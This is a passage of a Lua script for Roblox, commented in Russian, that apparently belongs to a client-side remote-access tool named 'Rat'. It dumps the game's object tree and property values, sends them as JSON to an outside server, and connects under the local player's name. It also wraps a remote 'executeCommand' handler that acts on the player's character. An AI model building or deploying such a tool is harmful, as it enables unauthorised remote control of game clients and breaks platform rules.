                        valueStr = string.format("%.2f, %.2f, %.2f", value.X, value.Y, value.Z)
                    elseif typeof(value) == "Color3" then
                        valueStr = string.format("%.2f, %.2f, %.2f", value.R, value.G, value.B)
                    elseif typeof(value) == "CFrame" then
                        local pos = value.Position
                        valueStr = string.format("%.2f, %.2f, %.2f", pos.X, pos.Y, pos.Z)
                    else
                        valueStr = tostring(value)
                    end
                    
                    -- Проверяем, можно ли редактировать свойство
                    local isEditable = pcall(function()
                        instance[propName] = value
                    end)
                    
                    table.insert(properties, {
                        name = propName,
                        value = valueStr,
                        type = typeof(value),
                        editable = isEditable
                    })
                end
            end
            
            return properties
        end
        
        -- Функция для рекурсивного обхода объектов
        local function processInstance(instance, path, maxDepth, currentDepth)
            if currentDepth > maxDepth then
                return nil
            end
            
            local result = {
                name = instance.Name,
                className = instance.ClassName,
                path = path,
                properties = getProperties(instance),
                children = {}
            }
            
            -- Получаем дочерние объекты
            local children = instance:GetChildren()
            for _, child in ipairs(children) do
                local childPath = path .. "." .. child.Name
                local childData = processInstance(child, childPath, maxDepth, currentDepth + 1)
                if childData then
                    table.insert(result.children, childData)
                end
            end
            
            return result
        end
        
        -- Собираем данные о структуре игры
        local results = {}
        local maxDepth = 3  -- Ограничиваем глубину для производительности
        
        -- Обрабатываем основные сервисы
        local services = {
            game:GetService("Workspace"),
            game:GetService("Players"),
            game:GetService("Lighting"),
            game:GetService("ReplicatedStorage"),
            game:GetService("StarterGui"),
            game:GetService("StarterPack")
        }
        
        for _, service in ipairs(services) do
            local serviceData = processInstance(service, service.Name, maxDepth, 1)
            if serviceData then
                table.insert(results, serviceData)
            end
        end
        
        -- Отправляем результаты клиенту
        client:sendToClient("Rat", "gameobjectsdata", game:GetService("HttpService"):JSONEncode(results))
    end)
    
    if not success then
        client:sendToClient("Rat", "notification", {
            text = "Ошибка при получении структуры игры: " .. errorMsg,
            type = "error"
        })
        return false, errorMsg
    end
    
    return true
end)

local response = client:connect(game.Players.LocalPlayer.Name)

-- Проверка успешности подключения
if not response or response.status ~= "connected" and response.status ~= "already connected" then
    local errorMsg = response and response.message or "Неизвестная ошибка"
    warn("Ошибка подключения к серверу: " .. errorMsg)
    
    -- Пытаемся переподключиться через некоторое время
    spawn(function()
        wait(5)
        local retryResponse = client:connect(game.Players.LocalPlayer.Name)
        if not retryResponse or (retryResponse.status ~= "connected" and retryResponse.status ~= "already connected") then
            warn("Повторная попытка подключения не удалась")
        end
    end)
end

-- Добавляем обработчик выхода из игры для корректного отключения
game:GetService("Players").PlayerRemoving:Connect(function(plr)
    if plr == game.Players.LocalPlayer then
        client:disconnect()
    end
end)

-- Система защиты от спама командами
local commandCooldowns = {}
local MAX_COMMANDS_PER_SECOND = 10
local COOLDOWN_RESET_TIME = 1

-- Функция для проверки и обновления кулдаунов команд
local function updateCommandCooldown()
    local currentTime = tick()
    
    -- Очищаем устаревшие кулдауны
    for command, lastTime in pairs(commandCooldowns) do
        if currentTime - lastTime > COOLDOWN_RESET_TIME then
            commandCooldowns[command] = nil
        end
    end
    
    -- Проверяем общее количество команд за последнюю секунду
    local commandCount = 0
    for _ in pairs(commandCooldowns) do
        commandCount = commandCount + 1
    end
    
    return commandCount < MAX_COMMANDS_PER_SECOND
end

-- Перехватываем обработку команд для добавления защиты от спама
local originalExecuteCommand = executeCommand
executeCommand = function(commandName, arg, player, character, humanoid, humanoidRootPart)
    if not updateCommandCooldown() then
        client:sendToClient("Rat", "notification", {
            text = "Слишком много команд за короткое время. Подождите немного.",
            type = "warning"
        })
        return false, "Превышен лимит команд"
    end
    
    -- Добавляем команду в кулдаун
    commandCooldowns[commandName .. tostring(tick())] = tick()
    
    -- Вызываем оригинальную функцию
    return originalExecuteCommand(commandName, arg, player, character, humanoid, humanoidRootPart)
end